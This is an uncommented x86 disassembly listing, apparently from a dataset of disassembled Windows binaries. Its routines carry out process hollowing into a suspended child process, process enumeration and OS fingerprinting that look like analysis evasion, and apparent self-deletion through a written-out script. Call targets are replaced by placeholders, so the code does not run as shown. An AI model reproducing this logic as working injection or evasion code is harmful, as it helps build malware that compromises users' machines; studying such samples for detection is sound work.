push edi
mov esi 0x103
push esi
xor ebx ebx
lea eax [ ebp - 0x2b3 ]
push ebx
push eax
mov [ ebp - 0x2b4 ] 0x0
call sub_2007940
push esi
lea eax [ ebp - 0x3bb ]
push ebx
push eax
mov [ ebp - 0x3bc ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x163 ]
push ebx
push eax
mov [ ebp - 0x164 ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x4c3 ]
push ebx
push eax
mov [ ebp - 0x4c4 ] bl
call sub_2007940
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
add esp 0x38
lea eax [ ebp - 0x164 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
mov esi [ GetProcAddress@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
push edi
call esi
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ ebp - 0x40 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x44
pop esi
push esi
lea eax [ ebp - 0x1ac ]
push ebx
push eax
call sub_2007940
xor eax eax
lea edi [ ebp - 0x30 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x2cc
stosd [ edi ]
lea eax [ ebp - 0x794 ]
push ebx
push eax
call sub_2007940
mov eax [ ebp + 0x8 ]
add esp 0x18
mov [ ebp - 0x1ac ] esi
cmp eax ebx
jne r-xdata
lea edx [ ebp - 0x2b4 ]
sub edx eax
push 0x104
lea eax [ ebp - 0x2b4 ]
push eax
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
mov cl [ ebp + eax - 0x2b4 ]
mov [ ebp + eax - 0x3bc ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x3bc ]
push 0x5c
push eax
call sub_2002110
pop ecx
pop ecx
mov [ eax ] bl
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1 ]
mov cl [ ebp + eax - 0x2b4 ]
mov [ ebp + eax - 0x164 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x1ac ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
push ebx
push 0x4
push ebx
push ebx
push ebx
lea eax [ ebp - 0x164 ]
push eax
push ebx
call [ CreateProcessA@IAT ]
push 0xa
mov esi eax
call [ Sleep@IAT ]
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x794 ]
push eax
push [ ebp - 0x2c ]
mov [ ebp - 0x794 ] 0x10007
call [ ebp - 0x18 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4c4 ]
push r--data
push eax
call sub_2010397
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2b4 ]
push eax
lea eax [ ebp - 0x4c4 ]
push eax
lea eax [ ebp - 0x164 ]
push eax
call sub_2001633
add esp 0x18
jmp r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x6f0 ]
add eax 0x8
push eax
push [ ebp - 0x30 ]
call [ ebp - 0x14 ]
test eax eax
jne r-xdata
push 0x1
push [ ebp - 0x30 ]
call [ ebp - 0xc ]
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x164 ]
push eax
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push 0x1
push [ ebp - 0x30 ]
mov esi eax
call [ ebp - 0xc ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
mov eax [ ebp - 0x6e4 ]
lea ecx [ ebp - 0x48 ]
push ecx
push 0x40
push 0x20
push eax
push [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
call [ ebp - 0x3c ]
mov edi [ ebp + 0xc ]
mov esi [ edi + 0x3c ]
push 0x4
push 0x3000
add esi edi
push [ esi + 0x50 ]
push [ esi + 0x34 ]
push [ ebp - 0x30 ]
call [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp eax ebx
jne r-xdata
push ebx
push [ esi + 0x54 ]
push edi
push eax
push [ ebp - 0x30 ]
call [ ebp - 0x1c ]
test eax eax
je r-xdata
push 0x1
push [ ebp - 0x30 ]
call [ TerminateProcess@IAT ]
jmp r-xdata
xor ecx ecx
lea eax [ esi + 0xf8 ]
mov [ ebp - 0x18 ] ebx
cmp cx [ esi + 0x6 ]
jae r-xdata
mov eax [ ebp - 0x14 ]
push ebx
mov [ ebp - 0x44 ] eax
push 0x4
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x6f0 ]
add eax 0x8
push eax
push [ ebp - 0x30 ]
mov [ ebp - 0x794 ] 0x10007
call [ ebp - 0x1c ]
test eax eax
je r-xdata
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x10 ] ecx
lea ecx [ eax + 0x24 ]
lea ebx [ eax + 0xc ]
lea edi [ eax + 0x10 ]
add eax 0x14
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x34 ] eax
mov ebx [ esi + 0x28 ]
add ebx [ ebp - 0x14 ]
lea eax [ ebp - 0x794 ]
push eax
push [ ebp - 0x2c ]
call [ ebp - 0x40 ]
test eax eax
je r-xdata
push 0x28
pop eax
add [ ebp - 0x34 ] eax
add [ ebp - 0x20 ] eax
add [ ebp - 0x10 ] eax
add edi eax
add ebx eax
movzx eax [ esi + 0x6 ]
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] eax
jl r-xdata
test eax eax
je r-xdata
sub ebx [ ebp - 0x38 ]
mov esi r--data
lea edi [ ebp - 0x54 ]
movsd [ edi ] [ esi ]
push 0x0
movsd [ edi ] [ esi ]
push 0xb
lea eax [ ebp - 0x54 ]
push eax
push [ ebp - 0x38 ]
movsw [ edi ] [ esi ]
push [ ebp - 0x30 ]
movsb [ edi ] [ esi ]
sub ebx 0x5
mov [ ebp - 0x53 ] ebx
call [ ebp - 0x1c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
add eax [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
push 0x0
push [ edi ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x30 ]
call [ ebp - 0x1c ]
cmp [ edi ] 0x0
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax 0x40000000
je r-xdata
push [ ebp - 0x2c ]
call [ ResumeThread@IAT ]
mov eax [ ebp - 0x30 ]
jmp r-xdata
test eax eax
jns r-xdata
mov [ ebp - 0x8 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
test eax 0x20000000
je r-xdata
mov [ ebp - 0x8 ] 0x4
lea eax [ ebp - 0x48 ]
push eax
push [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
push [ eax ]
mov eax [ ebx ]
add eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x30 ]
call [ ebp - 0x3c ]
test eax eax
je r-xdata
or [ ebp - 0x8 ] 0x10
test [ ebp - 0x8 ] 0x4
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
test [ ebp - 0x8 ] 0x2
je r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov [ ebp - 0x8 ] 0x20
sub_20111da
push esi
or eax 0xffffffff
xor esi esi
mov ecx [ esp + 0x8 ]
mov cl [ esi + ecx ]
push eax
movzx eax cl
push eax
call sub_2002253
pop ecx
call sub_2010306
inc esi
pop ecx
cmp esi 0x2c
jb r-xdata
pop esi
retn
sub_2011200
push ebp
mov ebp esp
mov eax 0x1360
call sub_200d790
push ebx
push esi
push edi
xor ebx ebx
push 0xeff
lea eax [ ebp - 0x135b ]
push ebx
push eax
mov [ ebp - 0x135c ] bl
call sub_2007940
mov esi 0x104
push esi
lea eax [ ebp - 0x22b ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x22c ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x123 ]
push ebx
push eax
mov [ ebp - 0x124 ] bl
call sub_2007940
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_2010397
mov esi [ GetModuleHandleA@IAT ]
add esp 0x34
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
xor edi edi
cmp [ rw-data ] bl
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
lea ecx [ ebp - 0x135c ]
mov eax rw-data
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x354 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x354 ] 0x128
call [ ebp - 0x14 ]
jmp r-xdata
add [ ebp - 0x8 ] 0xa0
inc edi
mov eax edi
imul eax eax 0x54
lea eax [ eax + rw-data ]
mov [ ebp - 0xc ] edi
cmp [ eax ] bl
jne r-xdata
mov esi [ ebp - 0x8 ]
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x45c ]
push eax
call sub_2010397
lea eax [ ebp - 0x45c ]
push r--data
push eax
call sub_2001a34
add esp 0x10
cmp eax ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
push ebx
call sub_2001a34
pop ecx
add esi 0x10
pop ecx
cmp eax ebx
jne r-xdata
cmp [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
jle r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
mov edx esi
sub edx eax
lea eax [ ebp - 0x354 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x354 ] 0x128
call [ ebp - 0x18 ]
mov esi [ ebp - 0x8 ]
imul esi esi 0xa0
lea esi [ ebp + esi - 0x135c ]
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx esi
mov esi [ ebp - 0x8 ]
imul esi esi 0xa0
lea esi [ ebp + esi - 0x135c ]
mov eax [ ebp - 0x8 ]
imul eax eax 0x54
mov ecx [ eax + rw-data ]
mov eax [ ebp + 0x8 ]
or [ eax ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
add esi 0x10
mov eax esi
mov edx esi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
jne r-xdata
push edx
lea eax [ ebp - 0x330 ]
push eax
call sub_20015e1
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
sub_2011439
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x140
push ebx
push edi
xor ebx ebx
push 0x3f
lea eax [ ebp - 0xc7 ]
push ebx
push eax
mov [ ebp - 0xc8 ] bl
call sub_2007940
push 0x3f
lea eax [ ebp - 0x87 ]
push ebx
push eax
mov [ ebp - 0x88 ] bl
call sub_2007940
mov edi 0x9c
push edi
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_2007940
add esp 0x24
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] edi
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
add ebp 0x78
leave
retn
mov eax [ ebp - 0x44 ]
sub eax 0x4
je r-xdata
cmp [ ebp - 0x40 ] 0x5a
sete al
lea eax [ eax * 4 + 0x4 ]
dec eax
je r-xdata
lea ecx [ ebp + 0x54 ]
push ecx
call eax
lea eax [ ebp + 0x54 ]
push eax
call [ GetSystemInfo@IAT ]
jmp r-xdata
cmp [ ebp - 0x40 ] ebx
jne r-xdata
dec eax
je r-xdata
or [ esi ] 0x1
cmp [ ebp + 0x54 ] 0x6
jne r-xdata
cmp [ ebp + 0x54 ] 0x9
je r-xdata
cmp [ ebp - 0x40 ] 0x1
jne r-xdata
mov [ esi ] 0xc
jmp r-xdata
mov eax [ ebp - 0x40 ]
cmp eax ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp - 0x40 ] 0x2
jne r-xdata
mov [ esi ] 0x10
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x88 ]
push r--data
push eax
call sub_2010397
add esp 0x10
push 0x9
pop ecx
xor eax eax
lea edi [ ebp + 0x54 ]
[ edi ]
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp + 0x52 ] 0x1
setne al
lea eax [ eax * 4 + 0x18 ]
jmp r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp + 0x52 ] al
sete al
dec al
and al 0xfd
add al 0x20
jmp r-xdata
mov [ esi ] al
cmp [ ebp + 0x52 ] 0x1
setne al
dec al
and al 0xfd
add al 0x14
jmp r-xdata
mov [ esi ] 0x15
jmp r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp + 0x52 ] 0x1
jne r-xdata
cmp [ ebp + 0x52 ] 0x1
jne r-xdata
mov [ esi ] 0x24
jmp r-xdata
mov [ esi ] 0x26
jmp r-xdata
sub_20115c0
push ebp
mov ebp esp
sub esp 0x334
push ebx
xor eax eax
push esi
xor ebx ebx
push 0x103
mov [ ebp - 0xc ] ax
mov [ ebp - 0xa ] ax
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] ax
lea eax [ ebp - 0x123 ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x124 ] bl
call sub_2007940
mov esi 0x104
push esi
lea eax [ ebp - 0x22b ]
push ebx
push eax
mov [ ebp - 0x22c ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x333 ]
push ebx
push eax
mov [ ebp - 0x334 ] bl
call sub_2007940
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x334 ]
push r--data
push eax
call sub_2010397
add esp 0x34
lea eax [ ebp - 0x22c ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x334 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push edi
lea eax [ ebp - 0x10 ]
push eax
push ebx
call esi
cmp eax 0x6f
jne r-xdata
mov esi [ ebp - 0x4 ]
push [ ebp - 0x10 ]
call sub_200178d
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push eax
mov [ ebp - 0x4 ] eax
call esi
test eax eax
je r-xdata
mov esi [ esi ]
cmp esi ebx
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0x30303030
mov eax ecx
mov edi edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
mov eax ecx
mov ecx [ ebp + 0xc ]
mov edi ecx
stosd [ edi ]
stosd [ edi ]
mov [ edx + 0x11 ] bl
mov [ ecx + 0x8 ] bl
jmp r-xdata
lea eax [ esi + 0x1b0 ]
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x4 ]
lea eax [ esi + 0x1b0 ]
lea edx [ ebp - 0x20 ]
sub edx eax
push [ ebp - 0x4 ]
call sub_20016b0
pop ecx
pop edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
lea eax [ ebp - 0x20 ]
xor edi edi
push eax
jmp r-xdata
call sub_2001a34
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push eax
call sub_20018fc
mov [ ebp + edi * 2 - 0xc ] ax
inc edi
cmp edi 0x4
pop ecx
jg r-xdata
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_2010397
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
push [ ebp + 0x8 ]
call sub_2001633
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_2010397
movsx eax [ ebp - 0x6 ]
push eax
movsx eax [ ebp - 0x8 ]
push eax
movsx eax [ ebp - 0xa ]
push eax
movsx eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push eax
push [ ebp + 0xc ]
call sub_2001633
add esp 0x48
push r--data
push ebx
sub_20117ba
push ebp
mov ebp esp
sub esp 0xc4
push ebx
xor ebx ebx
push 0x3f
lea eax [ ebp - 0x7f ]
push ebx
push eax
mov [ ebp - 0x80 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_2010397
push 0x3f
lea eax [ ebp - 0x3f ]
push ebx
push eax
mov [ ebp - 0x40 ] bl
call sub_2007940
add esp 0x14
lea eax [ ebp - 0x40 ]
push r--data
push eax
call sub_2010397
push 0x3f
lea eax [ ebp - 0xbf ]
push ebx
push eax
mov [ ebp - 0xc0 ] bl
call sub_2007940
add esp 0x14
lea eax [ ebp - 0xc0 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x80 ]
push eax
call sub_20109d0
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x40 ]
push eax
call sub_20109d0
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_20109d0
pop ecx
test eax eax
je r-xdata
pop ebx
leave
retn
sub_2011864
push ebp
mov ebp esp
sub esp 0x308
push 0xff
lea eax [ ebp - 0xff ]
push 0x0
push eax
mov [ ebp - 0x100 ] 0x0
call sub_2007940
lea eax [ ebp - 0x100 ]
push r--data
push eax
call sub_2010397
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x308 ]
add esp 0x14
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
test dl dl
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x308 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x100 ]
push eax
call sub_2010645
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push esi
push edi
lea edi [ ebp - 0x308 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi r--data
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x308 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
sub_2011929
push ebp
mov ebp esp
sub esp 0xb88
push ebx
push esi
push edi
xor ebx ebx
mov edi 0x103
push edi
lea eax [ ebp - 0x16b ]
push ebx
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x16c ] bl
call sub_2007940
add esp 0xc
push edi
lea eax [ ebp - 0x273 ]
push ebx
push eax
mov [ ebp - 0x274 ] bl
call sub_2007940
mov eax [ ebp + 0x8 ]
add esp 0xc
lea esi [ edi + 0x1 ]
cmp eax ebx
je r-xdata
push esi
lea eax [ ebp - 0x274 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x16c ]
push rw-data
push eax
call sub_2010397
lea eax [ ebp - 0x16c ]
push eax
call sub_20109d0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x16c ]
push rw-data
push eax
call sub_2010397
lea eax [ ebp - 0x16c ]
push eax
call sub_20109d0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x274 ]
sub edx eax
push esi
lea eax [ ebp - 0x58b ]
push ebx
push eax
mov [ ebp - 0x58c ] bl
call sub_2007940
add esp 0xc
push esi
lea eax [ ebp - 0x693 ]
push ebx
push eax
mov [ ebp - 0x694 ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0x58c ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x694 ]
push r--data
push eax
call sub_2010397
add esp 0x10
lea eax [ ebp - 0x694 ]
push eax
lea eax [ ebp - 0x58c ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x16c ]
push rw-data
push eax
call sub_2010397
lea eax [ ebp - 0x16c ]
push eax
call sub_20109d0
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x16c ]
push r--data
push eax
call sub_2010397
mov esi [ lstrcpyA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x274 ]
push eax
lea eax [ ebp - 0x79c ]
push eax
call esi
lea eax [ ebp - 0x79c ]
push 0x5c
push eax
call sub_2002110
pop ecx
mov [ eax ] bl
pop ecx
lea eax [ ebp - 0x79c ]
push eax
lea eax [ ebp - 0x484 ]
push eax
call esi
mov esi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x484 ]
push eax
call esi
lea eax [ ebp - 0x16c ]
push eax
lea eax [ ebp - 0x484 ]
push eax
call esi
push ebx
push 0x8000080
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x484 ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
push 0x4
push ebx
lea ecx [ ebp - 0x274 ]
push ecx
call eax
jmp r-xdata
push ebx
call [ PostQuitMessage@IAT ]
push edi
lea eax [ ebp - 0x37b ]
push ebx
push eax
mov [ ebp - 0x37c ] bl
call sub_2007940
add esp 0xc
lea eax [ ebp - 0xb84 ]
push r--data
push eax
call sub_2010397
pop ecx
lea edi [ ebp - 0xb84 ]
pop ecx
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x37c ]
push r--data
push eax
movsb [ edi ] [ esi ]
call sub_2010397
lea eax [ ebp - 0x274 ]
push eax
lea eax [ ebp - 0x37c ]
push eax
lea eax [ ebp - 0x16c ]
push eax
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x16c ]
add esp 0x14
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0xb84 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0xb84 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x37c ]
push r--data
push eax
movsb [ edi ] [ esi ]
call sub_2010397
lea eax [ ebp - 0x274 ]
push eax
lea eax [ ebp - 0x37c ]
push eax
lea eax [ ebp - 0x16c ]
push eax
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x16c ]
add esp 0x14
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0xb84 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0xb84 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x37c ]
push r--data
push eax
movsb [ edi ] [ esi ]
call sub_2010397
lea eax [ ebp - 0x484 ]
push eax
lea eax [ ebp - 0x37c ]
push eax
lea eax [ ebp - 0x16c ]
push eax
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x16c ]
add esp 0x14
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0xb84 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0xb84 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
push ebx
mov esi r--data
lea eax [ ebp - 0xc ]
movsw [ edi ] [ esi ]
push eax
lea eax [ ebp - 0xb84 ]
push eax
movsb [ edi ] [ esi ]
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0xb84 ]
push eax
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
push [ ebp + 0x8 ]
mov esi [ CloseHandle@IAT ]
call esi
push 0x64
call [ Sleep@IAT ]
push 0x44
pop edi
push edi
lea eax [ ebp - 0x64 ]
push ebx
push eax
call sub_2007940
add esp 0xc
xor eax eax
mov [ ebp - 0x34 ] ax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x64 ]
push eax
push ebx
push ebx
push edi
push ebx
push ebx
push ebx
lea eax [ ebp - 0x484 ]
push eax
push ebx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x38 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov edi [ SetThreadPriority@IAT ]
push 0xfffffff1
push [ ebp - 0x18 ]
call edi
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call edi
push 0x80
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push [ ebp - 0x1c ]
call esi
push [ ebp - 0x18 ]
call [ ResumeThread@IAT ]
push [ ebp - 0x18 ]
call esi
sub_2011db2
push ebp
mov ebp esp
sub esp 0x2c8
xor eax eax
push esi
push edi
mov [ ebp - 0x1c ] 0x0
lea edi [ ebp - 0x1b ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x38 ] 0x0
lea edi [ ebp - 0x37 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x28 ] 0x0
lea edi [ ebp - 0x27 ]
stosd [ edi ]
stosd [ edi ]
push 0x3f
stosb [ edi ]
xor esi esi
